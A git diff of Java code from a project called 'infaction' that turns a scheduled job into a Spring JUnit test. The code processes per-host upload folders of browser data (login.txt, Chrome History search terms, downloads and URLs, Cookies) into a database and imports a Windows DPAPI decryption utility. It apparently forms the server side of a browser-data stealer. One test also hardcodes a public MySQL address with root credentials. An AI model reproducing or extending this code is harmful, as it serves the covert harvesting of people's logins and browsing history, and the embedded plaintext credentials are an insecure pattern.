@@ -1,74 +1,83 @@
-package com.jimmy.infaction.job;
-
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.jimmy.infaction.common.*;
-import com.jimmy.infaction.pojo.*;
+
+import java.io.*;
+import java.sql.Connection;
+import java.sql.DriverManager;
+import java.sql.SQLException;
+import java.sql.Statement;
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.List;
+import java.util.Map;
+import java.util.concurrent.ScheduledThreadPoolExecutor;
+import java.util.concurrent.ThreadPoolExecutor;
+
+import com.jimmy.infaction.job.DeBagJob;
+import com.jimmy.infaction.pojo.Browser;
+import com.jimmy.infaction.pojo.Browser_download;
+import com.jimmy.infaction.pojo.Browser_keyword;
+import com.jimmy.infaction.pojo.Browser_url;
 import com.jimmy.infaction.service.*;
 import com.sun.jna.platform.win32.Crypt32Util;
 import org.apache.ibatis.annotations.Param;
-import org.quartz.Job;
-import org.quartz.JobExecutionContext;
-import org.quartz.JobExecutionException;
-import org.quartz.SchedulerException;
-import org.slf4j.Logger;
-import org.slf4j.LoggerFactory;
+import org.junit.Test;
+import org.junit.runner.RunWith;
 import org.springframework.beans.factory.annotation.Autowired;
-import org.springframework.context.ApplicationContext;
+import org.springframework.test.annotation.Commit;
+import org.springframework.test.annotation.Rollback;
+import org.springframework.test.context.ContextConfiguration;
+import org.springframework.test.context.junit4.AbstractTransactionalJUnit4SpringContextTests;
+import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
+
+import org.springframework.test.context.web.WebAppConfiguration;
+import org.springframework.transaction.annotation.Transactional;
 
 
-import java.io.*;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Map;
-
-/**
- * @author jimmy on 2019/9/26 17:50
- */
-public class DeBagJob  implements  Job {
-
-	private static Logger log = LoggerFactory.getLogger(DeBagJob.class);
-
-	@Override
-	public void execute(JobExecutionContext jobContext) throws JobExecutionException {
-		ApplicationContext applicationContext = null;
-		try {
-			//get sping context
-			applicationContext = getApplicationContext(jobContext);
-		} catch (Exception e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
-		//find xml register beanservice
-		ObjectMapper jsonMapper = (ObjectMapper) applicationContext.getBean("jsonMapper");
-		MachineService machineService = (MachineService) applicationContext.getBean("machineService");
-		BrowserService browserService = (BrowserService) applicationContext.getBean("browserService");
-		BrowserDownloadService browserDownloadService = (BrowserDownloadService) applicationContext.getBean("browserDownloadService");
-		BrowserKeywordService browserKeywordService = (BrowserKeywordService) applicationContext.getBean("browserKeywordService");
-		BrowserUrlService browserUrlService = (BrowserUrlService) applicationContext.getBean("browserUrlService");
-//		String rootPath = "F:\\workspace\\infaction\\upload\\";
-		String rootPath = "/opt/tomcat/webapps/upload/";
+@RunWith(SpringJUnit4ClassRunner.class)
+@ContextConfiguration(locations = "classpath:spring/spring-*.xml")
+@WebAppConfiguration("src/main/resources")
+@Transactional
+public class Debag extends AbstractTransactionalJUnit4SpringContextTests  {
+	@Autowired
+	private ObjectMapper jsonMapper;
+	@Autowired
+	private MachineService machineService ;
+	@Autowired
+	private BrowserService browserService ;
+	@Autowired
+	private BrowserKeywordService browserKeywordService ;
+	@Autowired
+	private BrowserDownloadService browserDownloadService ;
+	@Autowired
+	private BrowserUrlService  browserUrlService ;
+	@Autowired
+	private EventService eventService ;
+	@Test
+	@Rollback(false)
+	public  void  t1()  {
+		String rootPath = "F:\\workspace\\infaction\\upload\\";
 		File dir = new File(rootPath);
 		File[] files = dir.listFiles();
 		for (File f : files) {
-			if (!(f.getName().matches(".*.zip")) && !(f.getName().matches(".*.txt")) && !(f.getName().matches(".*img")) ) {
-				System.out.println(f.getName());
-				String hostid = f.getName().substring(0,36);
-				String brtype =  f.getName().substring((f.getName().lastIndexOf("-"))+1);
-				boolean exist = machineService.isExist(hostid);
-				// full delete before  full  insert
-				if (exist){
-					browserService.deleteExit(hostid,brtype);
-					browserDownloadService.deleteExit(hostid,brtype);
-					browserKeywordService.deleteExit(hostid,brtype);
-					browserUrlService.deleteExit(hostid,brtype);
-				}
+			String hostid = f.getName().substring(0,36);
+			String brtype =  f.getName().substring((f.getName().lastIndexOf("-"))+1);
+			if (!(f.getName().matches(".*.zip")) && !(f.getName().matches(".*favb.txt"))) {
 				for (File ff : f.listFiles()) {
-					int num = 10; //初始线程数
+					boolean exist = machineService.isExist(f.getName());
+					// update
+					if (exist){
+						browserService.deleteExit(hostid,brtype);
+						browserDownloadService.deleteExit(hostid,brtype);
+						browserKeywordService.deleteExit(hostid,brtype);
+						browserUrlService.deleteExit(hostid,brtype);
+					}
+					int num = 10;
 					try {
-						switch (ff.getName()) {
+						switch (ff.getName()){
 							case "login.txt":
-//								File file = new File(rootPath + f.getName()+"\\" +"login.txt");
-								File file = new File(rootPath + f.getName()+"/" +"login.txt");
+								File file = new File(rootPath + f.getName()+"\\" +"login.txt");
+//								File file = new File(rootPath + f.getName()+"/" +"login.txt");
 								InputStreamReader read = null;
 								BufferedReader reader = null;
 								try {
@@ -100,8 +109,8 @@ public class DeBagJob  implements  Job {
 								}
 								break;
 							case "History":
-								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"/"+"History");
-////								SqliteHelper hi = new SqliteHelper(rootPath + f.getName() + "\\" + "History");
+//								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"/"+"History");
+								SqliteHelper hi = new SqliteHelper(rootPath + f.getName() + "\\" + "History");
 								List<HistoryKeyResult> HkList = hi.executeQueryList("Select  lower_term FROM keyword_search_terms", HistoryKeyResult.class);
 								int klength = HkList.size();
 								int kbaseNum = klength / num;
@@ -147,19 +156,18 @@ public class DeBagJob  implements  Job {
 									} else if (di < dremainderNum) {
 										dend = dend + 1;
 									}
-									ExecMultiBag thread = new ExecMultiBag("线程[" + (di + 1) + "] ", HdList, start, dend, hostid,brtype, browserDownloadService);
+									ExecMultiBag thread = new ExecMultiBag("线程[" + (di + 1) + "] ", HdList, start, dend, hostid, brtype,browserDownloadService);
 									thread.start();
 								}
 								ff.delete();
 								break;
-//								System.out.println("----"+(System.currentTimeMillis() - start));
 							case "Cookies":
 								ff.delete();
 								break;
 //								System.out.println(ff.getName());
 							default:
 								ff.delete();
-								continue;
+								break;
 						}
 					} catch (Exception e) {
 						e.printStackTrace();
@@ -169,18 +177,6 @@ public class DeBagJob  implements  Job {
 			}
 		}
 	}
-
-	private static final String APPLICATION_CONTEXT_KEY = "applicationContextKey";
-
-	private ApplicationContext getApplicationContext(JobExecutionContext jobContext) throws SchedulerException {
-		ApplicationContext appCtx = null;
-		appCtx = (ApplicationContext) jobContext.getScheduler().getContext().get(APPLICATION_CONTEXT_KEY);
-		if (appCtx == null) {
-			throw new JobExecutionException("No application context available in scheduler context for key \"" + APPLICATION_CONTEXT_KEY + "\"");
-		}
-		return appCtx;
-	}
-
 	class ExecMultiBag extends Thread {
 		private String threadName;
 		private List<HistoryKeyResult> hklist;
@@ -196,11 +192,11 @@ public class DeBagJob  implements  Job {
 		private String hostid;
 		private String brtype;
 
-		public ExecMultiBag(String threadName, List list, int startIndex, int endIndex, String hostid,String brtype, Object service) {
+		public ExecMultiBag(String threadName, List list, int startIndex, int endIndex, String hostid,String brtype ,Object service) {
 			this.threadName = threadName;
 			this.hostid = hostid;
-			this.startIndex = startIndex;
 			this.brtype = brtype;
+			this.startIndex = startIndex;
 			this.endIndex = endIndex;
 			if (list.toString().matches("(.*)KeyResult(.*)")) {
 				this.hklist = list;
@@ -238,8 +234,8 @@ public class DeBagJob  implements  Job {
 				for (HistoryKeyResult result : kList) {
 					Browser_keyword browser_keyword = new Browser_keyword();
 					browser_keyword.setKeyword(result.getKey());
-					browser_keyword.setBrwtype(brtype);
 					browser_keyword.setHostid(hostid);
+					browser_keyword.setBrwtype(brtype);
 					browserKeywordService.insert(browser_keyword);
 				}
 			} else if (null != hllist) {
@@ -268,4 +264,27 @@ public class DeBagJob  implements  Job {
 			}
 		}
 	}
+//I dont understand rollback [true] why can commit?  java.sql.SQLException: Can't call commit when autocommit=true
+	@Test
+//	@Rollback()
+	public void jFactory () throws SQLException, ClassNotFoundException, IllegalAccessException, InstantiationException {
+		Class.forName("com.mysql.jdbc.Driver").newInstance();
+		try{
+			String sql = " insert into browser_download ( url, hostid, path ) values ('fasfsdaf','e5b51039-15d7-47a7-9470-adf9888dee3c','fdsafsaf')";
+			Connection conn = DriverManager.getConnection(
+					"jdbc:mysql://111.231.82.173:3306/infaction", "root", "zxc123");
+			Statement stmt = conn.createStatement();
+			stmt.execute(sql);
+//			conn.commit();
+			conn.close();
+		}catch (Exception e){
+			e.printStackTrace();
+		}
+	}
+
+	@Test
+	public void Arg() throws Exception{
+		browserService.deleteExit( "aaa","aaa");
+	}
+
 }
